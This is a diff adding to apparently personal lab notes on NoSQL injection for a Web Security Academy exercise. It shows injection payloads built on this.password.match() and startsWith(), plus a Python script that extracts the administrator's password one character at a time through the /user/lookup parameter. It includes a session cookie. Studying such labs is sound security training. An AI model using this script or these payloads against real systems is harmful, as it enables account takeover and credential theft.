@@ -61,4 +61,34 @@ admin' && this.password.match('^a') && '1'=='1
 admin' && this.password.startswith('a') && '1'=='1
 ```
 
-- 
+- Dumping the password with startswith() payload + python
+
+```python3
+#! /usr/bin/env python3
+import requests
+import asyncio
+import string
+
+#Replace host and cookie
+#necessary variables
+url: str = "https://0a0800e204bc44f580d6087f008e00af.web-security-academy.net"
+
+async def main():
+     headers = {"Cookie":"session=57tR4BdA7pjntM4pix5exS2nVIjtMSI3; Secure","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36Sec-Ch-Ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Brave\";v=\"140\""}
+     path = "/user/lookup"
+     charset = string.ascii_letters + '1234567890' + string.punctuation 
+     found_char = ""
+     while True:
+         for char in charset:
+            special_chars = "\\'"
+            if char in special_chars: char = '\\' + char
+            payload = f"administrator'%26%26this.username=='administrator'%26%26this.password.startsWith('{found_char + char}')%26%26'1'=='1"
+            result = requests.get(url + path + "?user="+ payload,headers=headers).text
+            if len(result) ==  96:
+               found_char += char
+               print(f"[+] Found_char::{found_char}")
+               break
+
+if __name__ == "__main__":
+    asyncio.run(main())
+```
